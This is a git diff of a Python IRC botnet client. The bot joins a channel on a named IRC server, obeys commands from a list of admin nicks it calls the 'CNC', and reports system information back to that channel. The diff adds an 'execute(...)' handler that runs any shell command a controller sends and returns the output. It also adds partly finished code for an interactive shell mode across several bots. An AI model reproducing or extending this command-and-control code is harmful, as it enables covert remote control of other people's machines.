@@ -3,6 +3,12 @@
 #Authors: Luke Matarazzo and Jackson Sadowski
 #Blizzo
 
+#to do list
+#fix system call to allow spaces
+#implement public IP
+#make more cross-platform instead of just for linux
+#enable directive one liners
+
 import socket
 import ftplib
 import urllib2
@@ -17,8 +23,7 @@ import subprocess as sub
 from sys import argv
 from random import randint
 
-def genNick():
-	os = platform.system().lower()
+def genNick(os):
 	rannum = str(randint(0000, 9999))
 	return str(os[:3] + rannum)
 
@@ -59,11 +64,15 @@ def reply(): #send back to IRC server that you are here
 	irc.send('PRIVMSG ' + channel + " :Yes I am here" + '\r\n')
 
 def whoAmI(): #execute whoami command and send output
-	cmd  = execute("whoami")
-	sendData(cmd)
+	output  = execute("whoami")
+	sendData(output)
 
 def iAmGood(): #send back to IRC server that you are good
 	irc.send('PRIVMSG ' + channel + " :I am good. And you?" + '\r\n')
+
+def runAndSend(cmd): #take a single command, run it, return output
+	output = execute(cmd)
+	sendData(output)
 
 def getAge(): #send uptime
 	irc.send('PRIVMSG ' + channel + " :I don't know how to do that yet boss." + '\r\n')
@@ -73,12 +82,12 @@ def terminate(): #terminate program and send goodbye message
 	exit()
 
 def freeSpace():
-	cmd = execute("df")
-	sendData(cmd)
+	output = execute("df")
+	sendData(output)
 
 def uptime():
-	cmd = execute("uptime")
-	sendData(cmd)
+	output = execute("uptime")
+	sendData(output)
 
 def info():
 	sendData(platform.release())
@@ -88,16 +97,17 @@ DEBUG = 0
 if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
 	DEBUG = 1
 
+#other vars
+os = platform.system().lower()
+INTERACT = [0, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
+					#index two is the boolean for if the interactive shell is with this bot
+
 #IRC Settings
 admins = ["king", "samorizu", "blackbear", "bigshebang"]
 server = "leagueachieve.info"
 port = 6667
 channel = "#lobby"
-botnick = genNick()
-
-#other vars
-INTERACT = [0, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
-					#index two is the boolean for if the interactive shell is with this bot
+botnick = genNick(os)
 
 print "The botnick is:", botnick
 
@@ -108,10 +118,27 @@ commands = {
 	"who are you" : whoAmI,
 	"how old are you" : getAge,
 	"zombie apocalypse" : terminate,
+	# "execute" : runAndSend,
 	"free" : freeSpace,
 	"uptime" : uptime,
 	"info" : info
 }
+
+#MAYBE have syntax like this '??botname: interactive' or '??botname: commands'
+	#interactive would be the interactive shell while commands would be just listen to 
+#or just allow one liners to bots like 'botnick: command'
+#have a function that acts like this 'execute(system command)'
+	#to single out bots you could say 'botnick: execute(ls)'
+
+#allow controller to add/remove bots to list of those listening to interactive shell
+#allow controller to tell singular bots or all bots to return output of command or success/failure only
+
+#interactive shell details - 
+#	'??bot1 bot2' or '??bot1' will enable interactive shell mode for the nicks given. Using 'all' as a nick will include all bots.
+#	You will be able to enter commands and receive input from each bot initiated in interactive shell mode until you enter
+#	'??finish' or you remove them from the interactive group. To remove one or more bots from the listening interactive shell
+#	group, use '??-bot1 bot2' or '??-bot1'. To add one or more bots to the group, use '??+bot1 bot2' or '??+bot1'. To change
+#	settings on bots in the group, use '???bot1 bot2' or '???bot1'. Changing settings still needs to be implemented.
 
 #function which parses the command and determine how to handle it
 def parseCommand(command):
@@ -126,26 +153,37 @@ def parseCommand(command):
 		host = command[(command.index("!~") + 2):command.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
 		hostname = host[:host.index("@")] #hostname: 'blarg'
 		client = host[(host.index("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'
+		
 		if DEBUG:
 			print "user is '%s'" % user
 			print "host is '%s'" % host
 			print "hostname is '%s'" % hostname
 			print "client is '%s'" % client
-		if user in admins:
+
+		if user in admins: #check if sender is an approved controller
 			tempCommand = command[command.index("PRIVMSG"):]
 			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
 
-			print "Recieved %s from the CNC" % command
-			if INTERACT[0]:
+			print "Recieved %s from the CNC" % command #print command
+
+			if INTERACT[0]: #if interactive shell is on
 				if "??finish" in command:
 					INTERACT[0] = 0
 					return
+				elif "??-" in command:
+					users = command[3:].split(" ")
+					if botnick in users or "all" in users:
+						INTERACT[1] = 0
 
-				sendData("I would have performed: '" + command + "'")
-			elif "??" in command:
+					return
+				elif "??+" in command:
+					return
+
+				if len(command) > 0:
+					sendData("I would have performed: '" + command + "'")
+			elif "??" in command: #if '??' is given
 				INTERACT[0] = 1
-				users = command[2:command.index(":")].split(" ")
-				command = command[(command.index(":") + 1):].strip()
+				users = command[2:].split(" ")
 
 				if DEBUG:
 					print "command is '%s'" % command
@@ -155,25 +193,36 @@ def parseCommand(command):
 				if not botnick in users and not "all" in users:
 					INTERACT[1] = 0
 					return
-
-				sendData("I would have performed: '" + command + "'")
-			elif command in commands.keys():
-				commands[command]()
-				print "function called"
 			else:
-				print "command '%s' not defined" % command
+				if command in commands.keys(): #if regular command
+					commands[command]() #call appropriate function
+					print "function called"
+				elif "execute(" in command: #if they want the execute command, make that work
+					runAndSend(command[command.index("execute(") + 8:command.index(")")].strip())
+				else: #if not recognized
+					print "command '%s' not defined" % command
 		else:
 			print "user '%s' not in list of admins" % user
+
 	else: #we should not be listening, so we'll wait for '??stop' to end interactive shell
 		# print "inside the interact else"
 		if "PRIVMSG" in command:
-			# print "inside interact else, privmsg if"
+			command = command[command.index("PRIVMSG"):]
+			command = command[(command.index(':') + 1):].strip().lower()
 			if "??finish" in command:
 				# print "inside interact else, privmsg if, ??finish if"
 				# print "interact 0: '%d'" % INTERACT[0]
 				# print "interact 1: '%d'" % INTERACT[1]
 				INTERACT[0] = 0
 				INTERACT[1] = 1
+			elif "??+" in command:
+				users = command[3:].split(" ")
+				for user in users:
+					print "user is '%s'" % user
+				print "get here"
+				if botnick in users or "all" in users:
+					print "get here 2"
+					INTERACT[1] = 1
 
 
 #Connecting to the IRC Server
@@ -185,7 +234,7 @@ irc.send("NICK "+ botnick +"\n") #sets nick
 
 temp=irc.recv(4096) #get response to setting nick
 if DEBUG:
-		print "text received: '%s'" % temp
+	print "text received: '%s'" % temp
 
 counter = 2
 while "nickname already in use" in temp.lower():
